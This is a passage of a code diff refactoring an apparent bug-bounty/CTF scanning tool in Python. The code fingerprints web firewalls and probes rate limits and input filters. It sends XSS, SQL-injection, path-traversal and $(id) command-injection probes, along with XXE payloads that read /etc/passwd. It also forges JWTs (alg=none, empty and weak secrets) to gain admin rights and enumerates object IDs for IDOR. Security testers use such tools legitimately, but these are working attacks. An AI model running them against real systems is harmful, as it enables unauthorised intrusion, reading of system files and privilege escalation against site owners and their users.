@@ -21,9 +21,10 @@ import os
 import re
 import threading
 import time
+from collections.abc import Mapping
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
-from typing import Any
+from typing import Any, Final
 
 import requests
 
@@ -32,6 +33,193 @@ from bugbounty_ctf.engine import SecurityScanner
 # ============================================================================
 # Defense Detection
 # ============================================================================
+
+SECURITY_HEADER_NAMES: Final = [
+    "Strict-Transport-Security",
+    "Content-Security-Policy",
+    "X-Frame-Options",
+    "X-Content-Type-Options",
+    "Referrer-Policy",
+    "Permissions-Policy",
+    "X-XSS-Protection",
+]
+
+WAF_PROBES: Final = [
+    ("?x=<script>alert(1)</script>", "XSS"),
+    ("?x=' OR 1=1--", "SQLi"),
+    ("?x=../../../etc/passwd", "LFI"),
+    ("?x=$(id)", "CMDi"),
+]
+
+WAF_BODY_INDICATORS: Final = [
+    ("blocked by", "Generic"),
+    ("access denied", "Generic"),
+    ("request blocked", "Generic"),
+    ("cloudflare", "Cloudflare"),
+    ("attention required", "Cloudflare"),
+    ("/cdn-cgi/", "Cloudflare"),
+    ("akamai", "Akamai"),
+    ("the requested url was rejected", "F5 BIG-IP ASM"),
+]
+
+INPUT_FILTER_TEST_CHARS: Final = {
+    "single_quote": "'",
+    "double_quote": '"',
+    "less_than": "<",
+    "greater_than": ">",
+    "ampersand": "&",
+    "pipe": "|",
+    "semicolon": ";",
+    "backtick": "`",
+    "parens": "()",
+    "braces": "{}",
+    "newline": "\n",
+    "null_byte": "\x00",
+}
+
+
+def _header_value(headers: Mapping[str, str], name: str) -> str | None:
+    expected = name.lower()
+    for header, value in headers.items():
+        if header.lower() == expected:
+            return str(value)
+    return None
+
+
+def _detect_header_waf(headers: Mapping[str, str]) -> str | None:
+    detected_waf: str | None = None
+    for header, value in headers.items():
+        h_lower = header.lower()
+        v_lower = str(value).lower()
+
+        if "cf-ray" in h_lower or "cloudflare" in v_lower:
+            detected_waf = "Cloudflare"
+        elif "x-amzn" in h_lower or "awselb" in h_lower or "x-amz-cf-id" in h_lower:
+            detected_waf = "AWS WAF / CloudFront"
+        elif "akamai" in v_lower or "x-akamai" in h_lower:
+            detected_waf = "Akamai"
+        elif "x-sucuri" in h_lower:
+            detected_waf = "Sucuri"
+        elif "incap_ses" in v_lower or "visid_incap" in v_lower:
+            detected_waf = "Imperva Incapsula"
+        elif "x-iinfo" in h_lower:
+            detected_waf = "Imperva"
+        elif "mod_security" in v_lower or "modsecurity" in v_lower:
+            detected_waf = "ModSecurity"
+    return detected_waf
+
+
+def _detect_waf(
+    base_url: str,
+    session: requests.Session,
+    paths: list[str] | None = None,
+) -> dict[str, Any]:
+    detected_waf: str | None = None
+    headers: dict[str, str] = {}
+    headers_checked = False
+    evidence: list[str] = []
+
+    try:
+        response = session.get(base_url, timeout=5)
+        headers = dict(response.headers)
+        headers_checked = True
+        detected_waf = _detect_header_waf(headers)
+    except requests.exceptions.RequestException as e:
+        evidence.append(f"Header check failed: {e}")
+
+    probe_paths = paths if paths is not None else ["/", "/admin", "/api", "/login"]
+    for path in probe_paths[:1]:
+        for payload, vtype in WAF_PROBES:
+            try:
+                response = session.get(base_url.rstrip("/") + path + payload, timeout=5)
+                if response.status_code in (403, 406, 429, 501):
+                    evidence.append(f"{vtype} probe → {response.status_code} (likely blocked)")
+                    if detected_waf is None:
+                        detected_waf = "Generic WAF (status-based detection)"
+                body_lower = response.text.lower()[:2000]
+                for indicator, name in WAF_BODY_INDICATORS:
+                    if indicator in body_lower:
+                        detected_waf = name
+                        evidence.append(f"Body match: '{indicator}' on {vtype} probe")
+                        break
+            except requests.exceptions.RequestException:
+                pass
+
+    return {
+        "waf": detected_waf,
+        "headers": headers,
+        "headers_checked": headers_checked,
+        "evidence": evidence,
+    }
+
+
+def _detect_csp(headers: Mapping[str, str]) -> dict[str, str]:
+    return {
+        "Content-Security-Policy": _header_value(headers, "Content-Security-Policy") or "MISSING"
+    }
+
+
+def _detect_hsts(headers: Mapping[str, str]) -> dict[str, str]:
+    return {
+        "Strict-Transport-Security": _header_value(headers, "Strict-Transport-Security")
+        or "MISSING"
+    }
+
+
+def _detect_security_headers(headers: Mapping[str, str]) -> dict[str, str]:
+    security_headers: dict[str, str] = {}
+    security_headers.update(_detect_hsts(headers))
+    security_headers.update(_detect_csp(headers))
+    for header in SECURITY_HEADER_NAMES[2:]:
+        security_headers[header] = _header_value(headers, header) or "MISSING"
+    return security_headers
+
+
+def _detect_rate_limit(base_url: str, session: requests.Session) -> dict[str, Any]:
+    print("[*] Probing rate limit...")
+    evidence: list[str] = []
+    rate_limit: str | None = None
+    try:
+        start = time.time()
+        for i in range(20):
+            response = session.get(base_url, timeout=3)
+            if response.status_code == 429:
+                rate_limit = f"Triggered after {i + 1} requests in {time.time() - start:.2f}s"
+                break
+            time.sleep(0.05)  # 50ms delay — avoids hammering
+        if rate_limit is None:
+            rate_limit = "No 429 in 20 burst requests"
+    except requests.exceptions.RequestException as e:
+        evidence.append(f"Rate limit probe failed: {e}")
+
+    return {"rate_limit": rate_limit, "evidence": evidence}
+
+
+def _detect_input_filters(base_url: str, session: requests.Session) -> list[dict[str, Any]]:
+    print("[*] Probing input filters...")
+    input_filters: list[dict[str, Any]] = []
+    try:
+        marker = "ZXTESTZX"
+        for name, char in INPUT_FILTER_TEST_CHARS.items():
+            payload = f"{marker}{char}{marker}"
+            response = session.get(base_url, params={"q": payload}, timeout=3)
+            if marker in response.text:
+                match = re.search(
+                    re.escape(marker) + r"(.*?)" + re.escape(marker),
+                    response.text,
+                    re.DOTALL,
+                )
+                if match and match.group(1) != char:
+                    input_filters.append(
+                        {
+                            "char": name,
+                            "original": repr(char),
+                            "reflected_as": repr(match.group(1)),
+                        }
+                    )
+    except requests.exceptions.RequestException:
+        pass
+    return input_filters
 
 
 def detect_defenses(
@@ -60,127 +248,17 @@ def detect_defenses(
     session = requests.Session()
     print(f"[*] Detecting defenses on {base_url}")
 
-    # 1. WAF Fingerprinting via header inspection
-    try:
-        r = session.get(base_url, timeout=5)
-        for header, value in r.headers.items():
-            h_lower = header.lower()
-            v_lower = str(value).lower()
+    waf_result = _detect_waf(base_url, session, paths)
+    defenses["waf"] = waf_result["waf"]
+    defenses["evidence"].extend(waf_result["evidence"])
+    if waf_result["headers_checked"]:
+        defenses["security_headers"] = _detect_security_headers(waf_result["headers"])
 
-            if "cf-ray" in h_lower or "cloudflare" in v_lower:
-                defenses["waf"] = "Cloudflare"
-            elif "x-amzn" in h_lower or "awselb" in h_lower or "x-amz-cf-id" in h_lower:
-                defenses["waf"] = "AWS WAF / CloudFront"
-            elif "akamai" in v_lower or "x-akamai" in h_lower:
-                defenses["waf"] = "Akamai"
-            elif "x-sucuri" in h_lower:
-                defenses["waf"] = "Sucuri"
-            elif "incap_ses" in v_lower or "visid_incap" in v_lower:
-                defenses["waf"] = "Imperva Incapsula"
-            elif "x-iinfo" in h_lower:
-                defenses["waf"] = "Imperva"
-            elif "mod_security" in v_lower or "modsecurity" in v_lower:
-                defenses["waf"] = "ModSecurity"
+    rate_limit_result = _detect_rate_limit(base_url, session)
+    defenses["rate_limit"] = rate_limit_result["rate_limit"]
+    defenses["evidence"].extend(rate_limit_result["evidence"])
 
-        sec_headers = [
-            "Strict-Transport-Security",
-            "Content-Security-Policy",
-            "X-Frame-Options",
-            "X-Content-Type-Options",
-            "Referrer-Policy",
-            "Permissions-Policy",
-            "X-XSS-Protection",
-        ]
-        for h in sec_headers:
-            defenses["security_headers"][h] = r.headers.get(h, "MISSING")
-    except requests.exceptions.RequestException as e:
-        defenses["evidence"].append(f"Header check failed: {e}")
-
-    # 2. WAF probe — send a known malicious payload
-    waf_probes = [
-        ("?x=<script>alert(1)</script>", "XSS"),
-        ("?x=' OR 1=1--", "SQLi"),
-        ("?x=../../../etc/passwd", "LFI"),
-        ("?x=$(id)", "CMDi"),
-    ]
-    for path in paths[:1]:
-        for payload, vtype in waf_probes:
-            try:
-                r = session.get(base_url.rstrip("/") + path + payload, timeout=5)
-                if r.status_code in (403, 406, 429, 501):
-                    defenses["evidence"].append(f"{vtype} probe → {r.status_code} (likely blocked)")
-                    if not defenses["waf"]:
-                        defenses["waf"] = "Generic WAF (status-based detection)"
-                body_lower = r.text.lower()[:2000]
-                for indicator, name in [
-                    ("blocked by", "Generic"),
-                    ("access denied", "Generic"),
-                    ("request blocked", "Generic"),
-                    ("cloudflare", "Cloudflare"),
-                    ("attention required", "Cloudflare"),
-                    ("/cdn-cgi/", "Cloudflare"),
-                    ("akamai", "Akamai"),
-                    ("the requested url was rejected", "F5 BIG-IP ASM"),
-                ]:
-                    if indicator in body_lower:
-                        defenses["waf"] = name
-                        defenses["evidence"].append(f"Body match: '{indicator}' on {vtype} probe")
-                        break
-            except requests.exceptions.RequestException:
-                pass
-
-    # 3. Rate limit detection — send rapid bursts with delays
-    print("[*] Probing rate limit...")
-    try:
-        burst_results: list[int] = []
-        start = time.time()
-        for i in range(20):
-            r = session.get(base_url, timeout=3)
-            burst_results.append(r.status_code)
-            if r.status_code == 429:
-                defenses["rate_limit"] = (
-                    f"Triggered after {i + 1} requests in {time.time() - start:.2f}s"
-                )
-                break
-            time.sleep(0.05)  # 50ms delay — avoids hammering
-        if not defenses["rate_limit"]:
-            defenses["rate_limit"] = "No 429 in 20 burst requests"
-    except requests.exceptions.RequestException as e:
-        defenses["evidence"].append(f"Rate limit probe failed: {e}")
-
-    # 4. Input filter detection
-    print("[*] Probing input filters...")
-    test_chars = {
-        "single_quote": "'",
-        "double_quote": '"',
-        "less_than": "<",
-        "greater_than": ">",
-        "ampersand": "&",
-        "pipe": "|",
-        "semicolon": ";",
-        "backtick": "`",
-        "parens": "()",
-        "braces": "{}",
-        "newline": "\n",
-        "null_byte": "\x00",
-    }
-    try:
-        marker = "ZXTESTZX"
-        for name, char in test_chars.items():
-            payload = f"{marker}{char}{marker}"
-            r = session.get(base_url, params={"q": payload}, timeout=3)
-            if marker in r.text:
-                m = re.search(re.escape(marker) + r"(.*?)" + re.escape(marker), r.text, re.DOTALL)
-                if m and m.group(1) != char:
-                    defenses["input_filters"].append(
-                        {
-                            "char": name,
-                            "original": repr(char),
-                            "reflected_as": repr(m.group(1)),
-                        }
-                    )
-    except requests.exceptions.RequestException:
-        pass
+    defenses["input_filters"] = _detect_input_filters(base_url, session)
 
     # Summary
     print(f"[*] WAF: {defenses['waf'] or 'None detected'}")
@@ -285,6 +363,158 @@ def test_race_condition(
 # XXE
 # ============================================================================
 
+XXE_BASELINE_XML: Final = "<?xml version='1.0'?><root><test>hello</test></root>"
+
+XXE_EXTERNAL_ENTITY_PAYLOADS: Final = {
+    "external_passwd": (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        "<root>&xxe;</root>"
+    ),
+    "external_hostname": (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
+        "<root>&xxe;</root>"
+    ),
+    "php_filter_b64": (
+        '<?xml version="1.0"?>\n'
+        "<!DOCTYPE root [<!ENTITY xxe SYSTEM "
+        '"php://filter/convert.base64-encode/resource=/etc/passwd">]>\n'
+        "<root>&xxe;</root>"
+    ),
+}
+
+XXE_PARAMETER_ENTITY_PAYLOADS: Final = {
+    "parameter_entity": (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">'
+        "<!ENTITY % all \"<!ENTITY exfil SYSTEM 'file:///etc/passwd'>\">%all;]>\n"
+        "<root>&exfil;</root>"
+    ),
+}
+
+
+def _xxe_baseline_response(
+    url: str,
+    method: str,
+    content_type: str,
+    session: requests.Session,
+) -> requests.Response | None:
+    try:
+        baseline = session.request(
+            method,
+            url,
+            data=XXE_BASELINE_XML,
+            headers={"Content-Type": content_type},
+            timeout=5,
+        )
+        print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
+        return baseline
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Baseline failed: {e}")
+        return None
+
+
+def _xxe_payload_result(
+    name: str,
+    payload: str,
+    url: str,
+    method: str,
+    content_type: str,
+    session: requests.Session,
+    baseline: requests.Response,
+) -> dict[str, Any] | None:
+    try:
+        response = session.request(
+            method,
+            url,
+            data=payload,
+            headers={"Content-Type": content_type},
+            timeout=10,
+        )
+        confirmed = False
+        indicators: list[str] = []
+
+        if "root:" in response.text and "/bin/" in response.text:
+            confirmed = True
+            indicators.append("/etc/passwd content reflected")
+        elif "cm9vdDp4OjA6MDpyb290" in response.text:
+            confirmed = True
+            indicators.append("base64-encoded /etc/passwd reflected")
+        elif response.status_code != baseline.status_code:
+            indicators.append(f"status changed: {baseline.status_code}→{response.status_code}")
+        elif len(response.text) != len(baseline.text):
+            indicators.append(f"length changed: {len(baseline.text)}→{len(response.text)}")
+
+        if confirmed:
+            print(f"[!] XXE CONFIRMED: {name}")
+            for indicator in indicators:
+                print(f"    - {indicator}")
+        elif indicators:
+            print(f"[?] {name}: {indicators}")
+        else:
+            print(f"[-] No change: {name}")
+
+        return {
+            "payload": name,
+            "confirmed": confirmed,
+            "indicators": indicators,
+            "status": response.status_code,
+        }
+    except requests.exceptions.RequestException as e:
+        print(f"[!] {name} failed: {e}")
+        return None
+
+
+def _xxe_external_entity(
+    url: str,
+    method: str,
+    content_type: str,
+    session: requests.Session,
+    baseline: requests.Response | None = None,
+) -> dict[str, Any]:
+    baseline_response = (
+        baseline
+        if baseline is not None
+        else _xxe_baseline_response(url, method, content_type, session)
+    )
+    if baseline_response is None:
+        return {"results": []}
+
+    results: list[dict[str, Any]] = []
+    for name, payload in XXE_EXTERNAL_ENTITY_PAYLOADS.items():
+        result = _xxe_payload_result(
+            name, payload, url, method, content_type, session, baseline_response
+        )
+        if result is not None:
+            results.append(result)
+    return {"results": results}
+
+
+def _xxe_parameter_injection(
+    url: str,
+    method: str,
+    content_type: str,
+    session: requests.Session,
+    baseline: requests.Response | None = None,
+) -> dict[str, Any]:
+    baseline_response = (
+        baseline
+        if baseline is not None
+        else _xxe_baseline_response(url, method, content_type, session)
+    )
+    if baseline_response is None:
+        return {"results": []}
+
+    results: list[dict[str, Any]] = []
+    for name, payload in XXE_PARAMETER_ENTITY_PAYLOADS.items():
+        result = _xxe_payload_result(
+            name, payload, url, method, content_type, session, baseline_response
+        )
+        if result is not None:
+            results.append(result)
+    return {"results": results}
+
 
 def test_xxe(
     url: str,
@@ -297,88 +527,15 @@ def test_xxe(
     print(f"[*] Testing XXE on {url}")
     session = scanner.session if scanner else requests.Session()
 
-    baseline_xml = "<?xml version='1.0'?><root><test>hello</test></root>"
-    try:
-        baseline = session.request(
-            method,
-            url,
-            data=baseline_xml,
-            headers={"Content-Type": content_type},
-            timeout=5,
-        )
-        print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Baseline failed: {e}")
+    baseline = _xxe_baseline_response(url, method, content_type, session)
+    if baseline is None:
         return []
 
-    payloads = {
-        "external_passwd": (
-            '<?xml version="1.0"?>\n'
-            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
-            "<root>&xxe;</root>"
-        ),
-        "external_hostname": (
-            '<?xml version="1.0"?>\n'
-            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
-            "<root>&xxe;</root>"
-        ),
-        "php_filter_b64": (
-            '<?xml version="1.0"?>\n'
-            "<!DOCTYPE root [<!ENTITY xxe SYSTEM "
-            '"php://filter/convert.base64-encode/resource=/etc/passwd">]>\n'
-            "<root>&xxe;</root>"
-        ),
-        "parameter_entity": (
-            '<?xml version="1.0"?>\n'
-            '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">'
-            "<!ENTITY % all \"<!ENTITY exfil SYSTEM 'file:///etc/passwd'>\">%all;]>\n"
-            "<root>&exfil;</root>"
-        ),
-    }
-
     results: list[dict[str, Any]] = []
-    for name, payload in payloads.items():
-        try:
-            r = session.request(
-                method,
-                url,
-                data=payload,
-                headers={"Content-Type": content_type},
-                timeout=10,
-            )
-            confirmed = False
-            indicators: list[str] = []
-
-            if "root:" in r.text and "/bin/" in r.text:
-                confirmed = True
-                indicators.append("/etc/passwd content reflected")
-            elif "cm9vdDp4OjA6MDpyb290" in r.text:  # base64 of "root:x:0:0:root"
-                confirmed = True
-                indicators.append("base64-encoded /etc/passwd reflected")
-            elif r.status_code != baseline.status_code:
-                indicators.append(f"status changed: {baseline.status_code}→{r.status_code}")
-            elif len(r.text) != len(baseline.text):
-                indicators.append(f"length changed: {len(baseline.text)}→{len(r.text)}")
-
-            if confirmed:
-                print(f"[!] XXE CONFIRMED: {name}")
-                for ind in indicators:
-                    print(f"    - {ind}")
-            elif indicators:
-                print(f"[?] {name}: {indicators}")
-            else:
-                print(f"[-] No change: {name}")
-
-            results.append(
-                {
-                    "payload": name,
-                    "confirmed": confirmed,
-                    "indicators": indicators,
-                    "status": r.status_code,
-                }
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"[!] {name} failed: {e}")
+    results.extend(_xxe_external_entity(url, method, content_type, session, baseline)["results"])
+    results.extend(
+        _xxe_parameter_injection(url, method, content_type, session, baseline)["results"]
+    )
 
     return results
 
@@ -543,6 +700,136 @@ def forge_jwt_hs256(payload: dict[str, Any], secret: str | bytes) -> str:
     return f"{h}.{p}.{_b64url_encode(sig)}"
 
 
+JWT_ADMIN_MARKERS: Final = [
+    "admin",
+    "administrator",
+    '"role":"admin"',
+    '"is_admin":true',
+    "dashboard",
+]
+
+JWT_WEAK_SECRETS: Final = [
+    "secret",
+    "password",
+    "key",
+    "jwt",
+    "admin",
+    "test",
+    "12345",
+    "your-256-bit-secret",
+    "default",
+    "changeme",
+]
+
+
+def _jwt_escalated_payload(token: str) -> dict[str, Any] | None:
+    decoded = decode_jwt(token)
+    if not decoded or "error" in decoded:
+        return None
+
+    escalated = dict(decoded["payload"])
+    for key in ["role", "roles"]:
+        if key in escalated:
+            escalated[key] = "admin"
+    escalated["role"] = "admin"
+    escalated["is_admin"] = True
+    escalated["admin"] = True
+    return escalated
+
+
+def _is_admin_response(response: requests.Response) -> bool:
+    if response.status_code != 200:
+        return False
+    body_lower = response.text.lower()
+    return any(marker in body_lower for marker in JWT_ADMIN_MARKERS)
+
+
+def _jwt_alg_none_attack(
+    token: str,
+    verify_endpoint: str,
+    header_name: str,
+    session: requests.Session,
+    *,
+    header_prefix: str = "Bearer ",
+) -> dict[str, Any]:
+    escalated = _jwt_escalated_payload(token)
+    none_token = forge_jwt_alg_none(escalated or {})
+    none_accepted = False
+    print("\n[*] Attack 1: alg=none")
+    try:
+        response = session.get(
+            verify_endpoint,
+            headers={header_name: header_prefix + none_token},
+            timeout=5,
+        )
+        if _is_admin_response(response):
+            print("[!] alg=none ACCEPTED — server allows unsigned tokens")
+            none_accepted = True
+        else:
+            print(f"[-] alg=none rejected (status={response.status_code})")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] alg=none probe failed: {e}")
+    return {"none": none_token, "none_accepted": none_accepted}
+
+
+def _jwt_hs256_empty_attack(
+    token: str,
+    verify_endpoint: str,
+    header_name: str,
+    session: requests.Session,
+    *,
+    header_prefix: str = "Bearer ",
+) -> dict[str, Any]:
+    escalated = _jwt_escalated_payload(token)
+    hs256_empty = forge_jwt_hs256(escalated or {}, "")
+    hs256_empty_accepted = False
+    print("\n[*] Attack 2: HS256 with empty secret")
+    try:
+        response = session.get(
+            verify_endpoint,
+            headers={header_name: header_prefix + hs256_empty},
+            timeout=5,
+        )
+        if _is_admin_response(response):
+            print("[!] HS256 with empty secret ACCEPTED")
+            hs256_empty_accepted = True
+        else:
+            print(f"[-] HS256 empty rejected (status={response.status_code})")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] HS256 empty probe failed: {e}")
+    return {"hs256_empty": hs256_empty, "hs256_empty_accepted": hs256_empty_accepted}
+
+
+def _jwt_weak_secret_attack(
+    token: str,
+    verify_endpoint: str,
+    header_name: str,
+    session: requests.Session,
+    *,
+    header_prefix: str = "Bearer ",
+) -> dict[str, Any]:
+    escalated = _jwt_escalated_payload(token)
+    print("\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
+    weak_secret: str | None = None
+    for secret in JWT_WEAK_SECRETS:
+        forged = forge_jwt_hs256(escalated or {}, secret)
+        try:
+            response = session.get(
+                verify_endpoint,
+                headers={header_name: header_prefix + forged},
+                timeout=3,
+            )
+            if _is_admin_response(response):
+                print(f"[!] HS256 with secret '{secret}' ACCEPTED")
+                weak_secret = secret
+                break
+        except requests.exceptions.RequestException:
+            continue
+    if weak_secret is None:
+        print("[-] No weak secret matched")
+    return {"weak_secret": weak_secret}
+
+
 def test_jwt_attacks(
     url: str,
     token: str,
@@ -568,94 +855,24 @@ def test_jwt_attacks(
     print(f"[*] Original header: {decoded['header']}")
     print(f"[*] Original payload: {decoded['payload']}")
 
-    base_payload = dict(decoded["payload"])
-    escalated = dict(base_payload)
-    for k in ["role", "roles"]:
-        if k in escalated:
-            escalated[k] = "admin"
-    escalated["role"] = "admin"
-    escalated["is_admin"] = True
-    escalated["admin"] = True
-
     test_target = verify_endpoint or url
 
-    # Confirmation: look for admin-specific markers, not just any content
-    admin_markers = [
-        "admin",
-        "administrator",
-        '"role":"admin"',
-        '"is_admin":true',
-        "dashboard",
-    ]
-
-    def _is_admin_response(r: requests.Response) -> bool:
-        if r.status_code != 200:
-            return False
-        body_lower = r.text.lower()
-        return any(marker in body_lower for marker in admin_markers)
-
-    # Attack 1: alg=none
-    none_token = forge_jwt_alg_none(escalated)
-    none_accepted = False
-    print("\n[*] Attack 1: alg=none")
-    try:
-        r = session.get(test_target, headers={header_name: header_prefix + none_token}, timeout=5)
-        if _is_admin_response(r):
-            print("[!] alg=none ACCEPTED — server allows unsigned tokens")
-            none_accepted = True
-        else:
-            print(f"[-] alg=none rejected (status={r.status_code})")
-    except requests.exceptions.RequestException as e:
-        print(f"[!] alg=none probe failed: {e}")
-
-    # Attack 2: HS256 with empty secret
-    hs256_empty = forge_jwt_hs256(escalated, "")
-    hs256_empty_accepted = False
-    print("\n[*] Attack 2: HS256 with empty secret")
-    try:
-        r = session.get(test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5)
-        if _is_admin_response(r):
-            print("[!] HS256 with empty secret ACCEPTED")
-            hs256_empty_accepted = True
-        else:
-            print(f"[-] HS256 empty rejected (status={r.status_code})")
-    except requests.exceptions.RequestException as e:
-        print(f"[!] HS256 empty probe failed: {e}")
-
-    # Attack 3: HS256 with weak secrets
-    print("\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
-    weak_secrets = [
-        "secret",
-        "password",
-        "key",
-        "jwt",
-        "admin",
-        "test",
-        "12345",
-        "your-256-bit-secret",
-        "default",
-        "changeme",
-    ]
-    weak_secret: str | None = None
-    for sec in weak_secrets:
-        forged = forge_jwt_hs256(escalated, sec)
-        try:
-            r = session.get(test_target, headers={header_name: header_prefix + forged}, timeout=3)
-            if _is_admin_response(r):
-                print(f"[!] HS256 with secret '{sec}' ACCEPTED")
-                weak_secret = sec
-                break
-        except requests.exceptions.RequestException:
-            continue
-    if weak_secret is None:
-        print("[-] No weak secret matched")
+    none_result = _jwt_alg_none_attack(
+        token, test_target, header_name, session, header_prefix=header_prefix
+    )
+    hs256_empty_result = _jwt_hs256_empty_attack(
+        token, test_target, header_name, session, header_prefix=header_prefix
+    )
+    weak_secret_result = _jwt_weak_secret_attack(
+        token, test_target, header_name, session, header_prefix=header_prefix
+    )
 
     return {
-        "none": none_token,
-        "none_accepted": none_accepted,
-        "hs256_empty": hs256_empty,
-        "hs256_empty_accepted": hs256_empty_accepted,
-        "weak_secret": weak_secret,
+        "none": none_result["none"],
+        "none_accepted": none_result["none_accepted"],
+        "hs256_empty": hs256_empty_result["hs256_empty"],
+        "hs256_empty_accepted": hs256_empty_result["hs256_empty_accepted"],
+        "weak_secret": weak_secret_result["weak_secret"],
         "decoded": decoded,
     }
 
@@ -881,6 +1098,83 @@ def _get_scanner_xss(url: str, scanner: SecurityScanner | None) -> SecurityScann
 # ============================================================================
 
 
+def _idor_baseline(
+    url_template: str,
+    session: SecurityScanner,
+    *,
+    method: str = "GET",
+    headers: dict[str, str] | None = None,
+) -> list[dict[str, Any]]:
+    request_headers = headers or {}
+    baseline_url = url_template.replace("{ID}", "1")
+    try:
+        baseline = session._make_request(method, baseline_url, headers=request_headers)
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Baseline request failed: {e}")
+        return [{"error": str(e)}]
+
+    print(f"[*] Baseline (ID=1): status={baseline.status_code}, length={len(baseline.text)}")
+    return [
+        {
+            "id": 1,
+            "url_template": url_template,
+            "method": method,
+            "headers": request_headers,
+            "status": baseline.status_code,
+            "text": baseline.text,
+        }
+    ]
+
+
+def _idor_compare(baseline: list[dict[str, Any]], session: SecurityScanner) -> list[dict[str, Any]]:
+    if not baseline or "error" in baseline[0]:
+        return []
+
+    from bugbounty_ctf.engine import _similarity_ratio
+
+    baseline_entry = baseline[0]
+    url_template = str(baseline_entry["url_template"])
+    method = str(baseline_entry["method"])
+    headers = baseline_entry["headers"]
+    baseline_text = str(baseline_entry["text"])
+    baseline_status = int(baseline_entry["status"])
+    results: list[dict[str, Any]] = []
+
+    for test_id in range(2, 51):
+        test_url = url_template.replace("{ID}", str(test_id))
+        try:
+            response = session._make_request(method, test_url, headers=headers)
+            similarity = _similarity_ratio(baseline_text, response.text)
+            same = similarity >= 0.90
+            status_match = response.status_code == baseline_status
+
+            result: dict[str, Any] = {
+                "id": test_id,
+                "status": response.status_code,
+                "length": len(response.text),
+                "same_as_baseline": same,
+                "status_match": status_match,
+            }
+            if not same and response.status_code == 200:
+                distinct_response = {
+                    "id": test_id,
+                    "status": response.status_code,
+                    "length": len(response.text),
+                    "length_diff": len(response.text) - len(baseline_text),
+                    "similarity": round(similarity, 3),
+                }
+                result["distinct_response"] = distinct_response
+                print(
+                    f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(response.text) - len(baseline_text):+d})"
+                )
+
+            results.append(result)
+        except requests.exceptions.RequestException as e:
+            print(f"[!] ID={test_id} failed: {e}")
+
+    return results
+
+
 def test_idor(
     url_template: str,
     *,
@@ -907,56 +1201,18 @@ def test_idor(
         headers["Authorization"] = f"Bearer {auth_token}"
 
     print(f"[*] Testing IDOR on {url_template}")
-    results: list[dict[str, Any]] = []
+    baseline = _idor_baseline(url_template, scanner, method=method, headers=headers)
+    if baseline and "error" in baseline[0]:
+        return {"error": baseline[0]["error"]}
 
-    # First request to ID=1 as baseline
-    baseline_url = url_template.replace("{ID}", "1")
-    try:
-        baseline = scanner._make_request(method, baseline_url, headers=headers)
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Baseline request failed: {e}")
-        return {"error": str(e)}
-
-    print(f"[*] Baseline (ID=1): status={baseline.status_code}, length={len(baseline.text)}")
-
-    baseline_text = baseline.text
-    distinct_responses: list[dict[str, Any]] = []
-
-    from bugbounty_ctf.engine import _similarity_ratio
-
-    for test_id in range(2, 51):
-        test_url = url_template.replace("{ID}", str(test_id))
-        try:
-            r = scanner._make_request(method, test_url, headers=headers)
-            similarity = _similarity_ratio(baseline_text, r.text)
-            same = similarity >= 0.90
-            status_match = r.status_code == baseline.status_code
-
-            if not same and r.status_code == 200:
-                distinct_responses.append(
-                    {
-                        "id": test_id,
-                        "status": r.status_code,
-                        "length": len(r.text),
-                        "length_diff": len(r.text) - len(baseline_text),
-                        "similarity": round(similarity, 3),
-                    }
-                )
-                print(
-                    f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(r.text) - len(baseline_text):+d})"
-                )
-
-            results.append(
-                {
-                    "id": test_id,
-                    "status": r.status_code,
-                    "length": len(r.text),
-                    "same_as_baseline": same,
-                    "status_match": status_match,
-                }
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"[!] ID={test_id} failed: {e}")
+    comparison_results = _idor_compare(baseline, scanner)
+    distinct_responses = [
+        item["distinct_response"] for item in comparison_results if "distinct_response" in item
+    ]
+    results = [
+        {key: value for key, value in item.items() if key != "distinct_response"}
+        for item in comparison_results
+    ]
 
     idor_likely = len(distinct_responses) > 0
     summary = {
@@ -965,7 +1221,7 @@ def test_idor(
         "idor_likely": idor_likely,
         "distinct_ids": distinct_responses,
         "baseline_id": 1,
-        "baseline_status": baseline.status_code,
+        "baseline_status": baseline[0]["status"],
     }
     if idor_likely:
         print(f"\n[!] IDOR LIKELY — {len(distinct_responses)} distinct 200-OK responses found")
@@ -987,6 +1243,51 @@ def test_idor(
 # ============================================================================
 # GraphQL Alias Batch Testing
 # ============================================================================
+
+
+def _graphql_batch_query(
+    url: str,
+    query_template: str,
+    aliases: str,
+    session: SecurityScanner,
+) -> dict[str, Any]:
+    query = query_template.replace("{ALIASES}", aliases)
+    try:
+        response = session._make_request(
+            "POST", url, json={"query": query}, headers={"Content-Type": "application/json"}
+        )
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Request failed: {e}")
+        return {"error": str(e)}
+
+    print(f"[*] Response: status={response.status_code}, length={len(response.text)}")
+
+    try:
+        data = response.json()
+    except (ValueError, json.JSONDecodeError):
+        data = {}
+
+    return {"status": response.status_code, "response": data}
+
+
+def _graphql_alias_detection(responses: dict[str, Any]) -> dict[str, Any]:
+    successes: list[str] = []
+    errors: list[str] = []
+
+    if responses.get("data"):
+        for alias, result in responses["data"].items():
+            if isinstance(result, dict) and result.get("success"):
+                successes.append(alias)
+                print(f"[!] {alias} → SUCCESS")
+
